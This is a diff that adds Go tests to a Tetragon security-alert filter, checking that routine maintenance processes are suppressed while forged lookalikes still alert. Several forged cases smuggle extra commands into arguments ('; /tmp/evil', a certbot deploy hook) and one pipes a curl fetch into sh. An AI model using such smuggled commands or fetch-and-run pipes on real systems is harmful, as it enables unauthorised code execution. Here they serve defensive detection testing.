@@ -394,6 +394,173 @@ func TestObservedAnsibleProbeShapesAreSuppressed(t *testing.T) {
 	}
 }
 
+func TestRoutineDesktopAndMaintenanceShapesAreSuppressed(t *testing.T) {
+	cfg := testConfig()
+	cfg.events = "process_exec"
+
+	cases := []struct {
+		name   string
+		binary string
+		args   string
+		parent string
+		reason string
+	}{
+		{"snap desktop integration", "/snap/snapd/current/usr/bin/snap", "run snapd-desktop-integration", "/usr/lib/systemd/systemd", "desktop"},
+		{"cups logrotate restart", "/bin/sh", "-c \"\n\t\tinvoke-rc.d --quiet cups restart > /dev/null\n\" logrotate_script \"/var/log/cups/*log \"", "/usr/sbin/logrotate", "cron"},
+		{"daily dpkg backup", "/etc/cron.daily/dpkg", "/etc/cron.daily/dpkg", "/usr/sbin/cron", "cron"},
+		{"dpkg package status", "/usr/bin/dpkg", "--status tailscale", "/usr/bin/tailscale", "package_query"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			line := execLine(t, tc.binary, tc.args, tc.parent)
+			_, _, ok, reason := tetragonAlertDecision(line, cfg)
+			if ok {
+				t.Fatal("routine shape was forwarded")
+			}
+			if reason != tc.reason {
+				t.Fatalf("reason = %q, want %q", reason, tc.reason)
+			}
+		})
+	}
+
+	forged := []struct {
+		name   string
+		binary string
+		args   string
+		parent string
+	}{
+		{"snap desktop lookalike", "/snap/snapd/current/usr/bin/snap", "run --shell microceph.log-rotate", "/usr/lib/systemd/systemd"},
+		{"cups restart payload", "/bin/sh", "-c \"\n\t\tinvoke-rc.d --quiet cups restart > /dev/null; /tmp/evil\n\" logrotate_script \"/var/log/cups/*log \"", "/usr/sbin/logrotate"},
+		{"other service restart", "/bin/sh", "-c \"\n\t\tinvoke-rc.d --quiet nginx restart > /dev/null\n\" logrotate_script \"/var/log/cups/*log \"", "/usr/sbin/logrotate"},
+		{"dpkg status payload", "/usr/bin/dpkg", "--status tailscale; /tmp/evil", "/usr/bin/tailscale"},
+	}
+	for _, tc := range forged {
+		t.Run(tc.name, func(t *testing.T) {
+			line := execLine(t, tc.binary, tc.args, tc.parent)
+			if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
+				t.Fatalf("forged shape was suppressed as %q", reason)
+			}
+		})
+	}
+}
+
+func TestCertbotPrivilegeDropIsSuppressed(t *testing.T) {
+	cfg := testConfig()
+	cfg.events = "process_kprobe"
+
+	line := privilegeArgsLine(t, "privilege-raises", "__sys_setfsuid",
+		"/usr/bin/certbot", "/usr/bin/certbot -q renew --no-random-sleep-on-renew")
+	_, _, ok, reason := tetragonAlertDecision(line, cfg)
+	if ok {
+		t.Fatal("certbot renew privilege transition was forwarded")
+	}
+	if reason != "expected_privilege" {
+		t.Fatalf("reason = %q, want expected_privilege", reason)
+	}
+
+	forged := []struct {
+		name   string
+		binary string
+		args   string
+	}{
+		{"certbot from tmp", "/tmp/certbot", "/tmp/certbot -q renew --no-random-sleep-on-renew"},
+		{"certbot with a hook", "/usr/bin/certbot", "/usr/bin/certbot renew --deploy-hook /tmp/evil"},
+	}
+	for _, tc := range forged {
+		t.Run(tc.name, func(t *testing.T) {
+			line := privilegeArgsLine(t, "privilege-raises", "__sys_setfsuid", tc.binary, tc.args)
+			if _, _, ok, reason := tetragonAlertDecision(line, cfg); !ok {
+				t.Fatalf("forged certbot shape was suppressed as %q", reason)
+			}
+		})
+	}
+}
+
+func TestPublicEgressIsRoutine(t *testing.T) {
+	proc := tetragonProcess{
+		Binary:    "/usr/bin/wget",
+		Arguments: "--no-config --connect-timeout=7 --tries=1 --dns-timeout=7 -q --header=Metadata-Flavor:Google -O - http://metadata.google.internal/computeMetadata/v1/instance/id",
+	}
+	if reason := routineExecReason(proc, nil); reason != "public_egress" {
+		t.Fatalf("public fetch = %q, want public_egress", reason)
+	}
+
+	version := proc
+	version.Arguments = "--version"
+	if reason := routineExecReason(version, nil); reason != "package_query" {
+		t.Fatalf("fetch version query = %q, want package_query", reason)
+	}
+
+	private := proc
+	private.Arguments = "http://10.0.0.12:2381/metrics"
+	if reason := routineExecReason(private, nil); reason != "" {
+		t.Fatalf("private fetch was suppressed as %q", reason)
+	}
+
+	unixSocket := proc
+	unixSocket.Arguments = "--unix-socket /run/incus.sock http://localhost/1.0/instances"
+	if reason := routineExecReason(unixSocket, nil); reason != "" {
+		t.Fatalf("unix-socket fetch was suppressed as %q", reason)
+	}
+
+	shell := proc
+	shell.Binary = "/bin/sh"
+	shell.Arguments = `-c "curl https://example.com/"`
+	if reason := routineExecReason(shell, nil); reason != "public_egress" {
+		t.Fatalf("public shell fetch = %q, want public_egress", reason)
+	}
+	shell.Arguments = `-c "curl http://10.0.0.12:2381/metrics"`
+	if reason := routineExecReason(shell, nil); reason != "" {
+		t.Fatalf("private shell fetch was suppressed as %q", reason)
+	}
+	shell.Arguments = `-c "curl https://example.com/; /tmp/evil"`
+	if reason := routineExecReason(shell, nil); reason != "" {
+		t.Fatalf("composed shell fetch was suppressed as %q", reason)
+	}
+	shell.Arguments = `-c "curl https://example.com/ | sh"`
+	if reason := routineExecReason(shell, nil); reason != "" {
+		t.Fatalf("piped shell fetch was suppressed as %q", reason)
+	}
+
+	body := tetragonLog{
+		FunctionName: "tcp_connect",
+		Process:      proc,
+	}
+	body.Process.Binary = "/usr/bin/curl"
+	body.Process.Arguments = "https://example.com/"
+	body.Args, _ = json.Marshal([]any{map[string]any{
+		"sock_arg": map[string]any{"daddr": "203.0.113.10", "dport": 443},
+	}})
+	if reason := expectedTCPReason(&body); reason != "public_egress" {
+		t.Fatalf("public connect = %q, want public_egress", reason)
+	}
+	body.Args, _ = json.Marshal([]any{map[string]any{
+		"sock_arg": map[string]any{"daddr": "10.0.0.12", "dport": 2381},
+	}})
+	if reason := expectedTCPReason(&body); reason != "" {
+		t.Fatalf("private connect was suppressed as %q", reason)
+	}
+}
+
+func privilegeArgsLine(t *testing.T, policy, function, binary, args string) string {
+	t.Helper()
+	line, err := json.Marshal(map[string]any{
+		"process_kprobe": map[string]any{
+			"policy_name":   policy,
+			"function_name": function,
+			"process": map[string]any{
+				"binary":    binary,
+				"arguments": args,
+				"uid":       uint32(0),
+			},
+		},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return string(line)
+}
+
 func TestDedupKeyIncludesSeverity(t *testing.T) {
 	cfg := testConfig()
 	warning := newAlert(cfg, sourceTetragon, "warning", "host", "tcp-connect", "connect 10.0.0.1:443")
